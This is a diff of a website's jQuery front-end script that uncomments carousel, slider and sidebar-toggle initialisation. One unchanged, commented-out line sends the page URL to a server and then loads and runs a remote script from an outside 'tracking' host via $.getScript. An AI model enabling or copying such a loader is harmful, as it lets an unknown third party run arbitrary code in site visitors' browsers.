@@ -65,7 +65,7 @@ $(function () {
 	/* OwlCarousel - Blog Post slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	/*$(document).ready(function () {
+	$(document).ready(function () {
 		var owl = $('.carousel-slider-post');
 		owl.owlCarousel({
 			items: 1,
@@ -75,12 +75,12 @@ $(function () {
 			autoplayTimeout: 3000,
 			autoplayHoverPause: true
 		});
-	});*/
+	});
 
 	/* OwlCarousel - Banner Rotator Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	/*$(document).ready(function () {
+	$(document).ready(function () {
 		var owl = $('.banner-rotator-slider');
 		owl.owlCarousel({
 			items: 1,
@@ -93,12 +93,12 @@ $(function () {
 			autoplayTimeout: 3000,
 			autoplayHoverPause: true
 		});
-	});*/
+	});
 
 	/* OwlCarousel - Product Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	/*$(document).ready(function () {
+	$(document).ready(function () {
 		var owl = $('#product-in-slider');
 		owl.owlCarousel({
 			loop: true,
@@ -128,8 +128,7 @@ $(function () {
 			}
 			e.preventDefault();
 		});
-	});*/
-
+	});
 
 	/*function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });*/
 	/* Scroll to Top
@@ -275,7 +274,7 @@ $(function () {
 	/* Deal Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	/*$('.deal-slider').slick({
+	$('.deal-slider').slick({
 		dots: false,
 		infinite: false,
 		prevArrow: '.previous-deal',
@@ -305,12 +304,12 @@ $(function () {
 				slidesToScroll: 1
 			}
 		}]
-	});*/
+	});
 
 	/* News Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	/*$('#news-slider').slick({
+	$('#news-slider').slick({
 		dots: false,
 		infinite: false,
 		prevArrow: '.previous',
@@ -339,7 +338,7 @@ $(function () {
 				slidesToScroll: 1
 			}
 		}]
-	});*/
+	});
 
 	/* Fancybox
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -354,19 +353,19 @@ $(function () {
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	/*$(document).ready(function () {
+	$(document).ready(function () {
 		$('#sidebarCollapse').on('click', function () {
 			$('#sidebar').toggleClass('active');
 			$(this).toggleClass('active');
 		});
-	});*/
+	});
 
 	/* Product slider 
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	// optional
-	/*$('#blogCarousel').carousel({
+	$('#testimonial').carousel({
 		interval: 5000
-	});*/
+	});
 
 
 });
